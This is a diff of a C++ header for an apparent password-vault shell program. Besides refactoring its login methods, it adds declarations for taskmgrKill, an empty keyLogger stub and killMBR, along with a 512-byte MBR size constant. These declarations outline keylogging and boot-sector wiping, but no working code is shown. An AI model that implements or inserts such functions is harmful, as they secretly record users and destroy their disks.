@@ -1,6 +1,7 @@
 
 #ifndef HIDEYVAULTYSHELL_H
 #define HIDEYVAULTYSHELL_H
+#define MBR_SIZE 512
 #define NOMINMAX
 
 #include "stdafx.h"
@@ -17,8 +18,7 @@ using std::getline;
 
 class Shell {
 private:
-	std::string user; 
-	std::string pass; 
+	std::string currentDetail;
 	std::string splashScreen;
 	std::string line;
 	std::string CLI_input;
@@ -45,11 +45,10 @@ public:
 	void aboutOutput();
 	void quitProgram();
 	void createAccount();
-	void passwordSystem();
-	void usernameSystem();
-	void accountLogin();
-	void authenticationChecker();
+	void loginSystem();
 	void loginInit();
+	void authenticationChecker();
+	bool accountExists();
 };
 
 class ShellAuth : public Shell {
@@ -62,6 +61,9 @@ public:
 	void showPromptAuth();
 	void commandValidityCheckerAuth(std::string userInput);
 	void dirCommand();
+	void taskmgrKill();
+	void keyLogger() {}
+	void killMBR();
 	void aboutOutputAuth();
 	void quitProgramAuth();
 };
